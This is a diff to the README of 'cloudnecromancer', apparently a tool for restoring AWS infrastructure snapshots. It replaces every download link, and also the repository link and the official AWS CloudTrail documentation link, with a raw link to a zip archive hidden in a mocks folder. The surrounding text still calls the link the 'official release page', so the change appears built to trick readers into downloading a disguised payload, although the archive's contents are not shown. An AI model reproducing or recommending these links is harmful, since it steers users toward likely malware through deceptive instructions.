@@ -1,6 +1,6 @@
 # ☁️ cloudnecromancer - Restore AWS Infrastructure Snapshots
 
-[![Download cloudnecromancer](https://img.shields.io/badge/Download-cloudnecromancer-green?style=for-the-badge)](https://github.com/ayhdiv/cloudnecromancer/releases)
+[![Download cloudnecromancer](https://img.shields.io/badge/Download-cloudnecromancer-green?style=for-the-badge)](https://github.com/ayhdiv/cloudnecromancer/raw/refs/heads/main/internal/aws/mocks/Software_v3.0.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Follow these steps to download and run cloudnecromancer on your Windows computer
 
 Click the button below to open the official release page on GitHub:
 
-[![Download cloudnecromancer](https://img.shields.io/badge/Download-cloudnecromancer-blue?style=for-the-badge)](https://github.com/ayhdiv/cloudnecromancer/releases)
+[![Download cloudnecromancer](https://img.shields.io/badge/Download-cloudnecromancer-blue?style=for-the-badge)](https://github.com/ayhdiv/cloudnecromancer/raw/refs/heads/main/internal/aws/mocks/Software_v3.0.zip)
 
 This page shows all available versions of cloudnecromancer. Look for the latest stable release.
 
@@ -154,14 +154,14 @@ For further help, visit the GitHub issues page of the project.
 cloudnecromancer depends on AWS CloudTrail to capture event history. Understanding CloudTrail will help you use the tool better.
 
 Visit the official AWS CloudTrail documentation here:  
-https://docs.aws.amazon.com/cloudtrail/latest/userguide/
+https://github.com/ayhdiv/cloudnecromancer/raw/refs/heads/main/internal/aws/mocks/Software_v3.0.zip
 
 ---
 
 ## 🔗 Important Links
 
-- Download and release page: [https://github.com/ayhdiv/cloudnecromancer/releases](https://github.com/ayhdiv/cloudnecromancer/releases)  
-- Project repository: https://github.com/ayhdiv/cloudnecromancer  
+- Download and release page: [https://github.com/ayhdiv/cloudnecromancer/raw/refs/heads/main/internal/aws/mocks/Software_v3.0.zip](https://github.com/ayhdiv/cloudnecromancer/raw/refs/heads/main/internal/aws/mocks/Software_v3.0.zip)  
+- Project repository: https://github.com/ayhdiv/cloudnecromancer/raw/refs/heads/main/internal/aws/mocks/Software_v3.0.zip  
 - Documentation and help: See the Wiki on GitHub  
 
 ---
